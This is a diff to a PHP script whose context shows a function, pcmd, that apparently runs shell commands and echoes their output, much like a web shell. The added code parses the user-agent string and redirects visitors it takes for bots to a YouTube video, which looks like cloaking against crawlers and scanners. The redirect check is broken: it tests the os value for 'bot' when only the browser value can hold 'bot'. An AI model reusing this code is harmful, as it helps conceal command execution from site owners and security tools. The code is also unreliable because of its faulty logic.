@@ -22,6 +22,34 @@ function pcmd($command) {
     pclose($fp);
     echo $data;
 }
+function get_browser_info() {
+    // This is to allow strpos() to never return 0 on a success
+    $ua = " " . strtolower($_SERVER['HTTP_USER_AGENT']);
+    $os = 'windows';
+    $browser = 'bot';
+    $result = array();
+
+    if(preg_match('/linux/i', $ua)) $os = 'linux';
+    elseif(preg_match('/macintosh|mac\s+os\s+x/i', $ua)) $os = 'mac';
+    elseif(preg_match('/windows|win32/i', $ua)) $os = 'windows';
+
+    if(strpos($ua, 'opera') || strpos($ua, 'opr/')) $browser = 'opera';
+    elseif(strpos($ua, 'edge')) $browser = 'edge';
+    elseif(strpos($ua, 'chrome')) $browser = 'chrome';
+    elseif(strpos($ua, 'safari')) $browser = 'safari';
+    elseif(strpos($ua, 'firefox')) $browser = 'firefox';
+    elseif(strpos($ua, 'msie') || strpos($ua, 'trident/7')) $browser = 'ie';
+
+    $result["os"] = $os;
+    $result["browser"] = $browser;
+    return $result;
+}
+
+$browser_info = get_browser_info();
+if(($browser_info["os"] == "bot")) {
+    header('Location: https://www.youtube.com/watch?v=E_R9EaeRrWg', true, 302);
+    exit();
+}
 
 $isLocal                = false;
 if(is_local_ip()) {
